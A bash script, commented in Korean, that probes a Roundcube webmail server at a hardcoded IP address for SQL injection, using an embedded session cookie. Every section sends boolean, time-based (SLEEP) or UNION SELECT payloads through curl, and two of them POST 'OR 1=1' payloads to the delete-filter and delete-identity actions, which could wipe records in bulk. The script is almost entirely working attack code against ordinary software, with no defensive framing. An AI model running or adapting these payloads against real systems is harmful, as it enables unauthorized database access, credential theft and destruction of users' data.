#!/bin/bash
# Roundcube SQLi 탐색
# Time-based Blind SQLi를 타이밍으로 검증

TARGET="http://13.125.104.131:30083"
SESSION_COOKIE="roundcube_sessauth=pppFdrSD1OslI9oOCaYj4CVgUd-1787101200; roundcube_sessid=i02l4jam87su5mp5mieh6hq9od"

echo "=== Roundcube SQLi 탐색 ==="
echo

# 1. Contacts search - Boolean-based SQLi
echo "[*] 1. Contacts Search - Boolean-based"
echo "    Payload: _search=*' OR '1'='1"
BEFORE=$(date +%s%N)
curl -s -b "$SESSION_COOKIE" \
  "${TARGET}/?_task=contacts&_search=*' OR '1'='1" \
  -o /dev/null -w "%{http_code}\n"
AFTER=$(date +%s%N)
TIME=$(( ($AFTER - $BEFORE) / 1000000 ))
echo "    Response time: ${TIME}ms"
echo

# 2. Mail folder filter
echo "[*] 2. Mail Folder - Time-based SQLi"
echo "    Payload: _mbox=Inbox' AND SLEEP(5) -- -"
BEFORE=$(date +%s%N)
curl -s -b "$SESSION_COOKIE" \
  "${TARGET}/?_task=mail&_mbox=Inbox' AND SLEEP(5) -- -" \
  -o /dev/null -w "%{http_code}\n" \
  --max-time 10
AFTER=$(date +%s%N)
TIME=$(( ($AFTER - $BEFORE) / 1000000 ))
echo "    Response time: ${TIME}ms (expect >5000ms if vulnerable)"
echo

# 3. Contact ID parameter
echo "[*] 3. Contact ID - UNION-based SQLi"
echo "    Payload: _id=1 UNION SELECT user_id,username FROM users LIMIT 1"
curl -s -b "$SESSION_COOKIE" \
  "${TARGET}/?_task=contacts&_id=1 UNION SELECT user_id,username FROM users -- -" \
  | grep -oE '<td>[^<]+</td>' | head -10
echo

# 4. Settings parameter
echo "[*] 4. Settings - SQLi in preferences"
echo "    Payload: _section=1' OR '1'='1"
curl -s -b "$SESSION_COOKIE" \
  "${TARGET}/?_task=settings&_section=1' OR '1'='1" \
  -o /dev/null -w "HTTP %{http_code}\n"
echo

# 5. Filter parameter
echo "[*] 5. Mail Filter - SQLi"
echo "    Payload: _filter_id=1' OR 1=1 -- -"
BEFORE=$(date +%s%N)
curl -s -b "$SESSION_COOKIE" \
  "${TARGET}/?_task=settings&_action=delete-filter&_filter_id=1' OR 1=1 -- -" \
  -X POST \
  --max-time 5 \
  -o /dev/null -w "%{http_code}\n"
AFTER=$(date +%s%N)
TIME=$(( ($AFTER - $BEFORE) / 1000000 ))
echo "    Response time: ${TIME}ms"
echo

# 6. Address book search
echo "[*] 6. Addressbook - Time-based SQLi"
BEFORE=$(date +%s%N)
curl -s -b "$SESSION_COOKIE" \
  "${TARGET}/?_task=addressbook&_search=*' AND (SELECT SLEEP(3)) -- -" \
  -o /dev/null -w "%{http_code}\n" \
  --max-time 10
AFTER=$(date +%s%N)
TIME=$(( ($AFTER - $BEFORE) / 1000000 ))
echo "    Response time: ${TIME}ms"
echo

# 7. Identity parameter
echo "[*] 7. Identity - SQLi"
curl -s -b "$SESSION_COOKIE" \
  "${TARGET}/?_task=settings&_action=delete-identity&_iid=1' OR '1'='1" \
  -X POST \
  -w "HTTP %{http_code}\n" \
  -o /dev/null
echo

# 8. Custom plugin parameter
echo "[*] 8. Plugin Parameter - SQLi"
curl -s -b "$SESSION_COOKIE" \
  "${TARGET}/?_task=settings&_plugin=*' OR '1'='1" \
  -o /dev/null -w "HTTP %{http_code}\n"
echo

echo "[+] SQLi 탐색 완료"
